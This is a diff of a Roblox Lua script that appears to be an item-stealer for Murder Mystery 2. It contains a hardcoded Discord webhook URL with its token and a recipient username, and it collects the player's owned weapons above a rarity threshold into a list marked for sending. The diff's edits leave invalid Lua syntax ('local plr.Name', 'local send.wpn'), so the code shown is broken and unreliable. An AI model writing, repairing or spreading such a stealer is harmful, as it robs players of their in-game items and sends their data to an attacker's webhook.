@@ -1,7 +1,7 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
-local plr = Players.LocalPlayer
+local plr.Name = Players.LocalPlayer
 
 getgenv().user = "MM2danya7"
 local webhook = "https://discord.com/api/webhooks/1415660439702081587/f-WR6U-AmmoTFBPnxXlBqWKaelol6TsPDDMmmGSh0yKjUi6gzefqilg1se3M3mtl1AjS"
@@ -50,13 +50,13 @@ if targetPlayer then
 } -- Нужно заполнить реальными данными предметов
         
         -- Определение предметов для отправки
-        local send_wpn = {}
+        local send.wpn = {}
         for dataid, amount in pairs(profileData.Weapons.Owned) do
             local itemInfo = database[dataid]
             if itemInfo then
                 local rarityIndex = table.find(rarityTable, itemInfo.Rarity)
                 if rarityIndex and rarityIndex >= min_rarityindex then
-                    table.insert(send_wpn, {
+                    table.insert(send.wpn, {
                         DataID = itemInfo.ItemName,
                         Rarity = itemInfo.Rarity,
                         Amount = amount
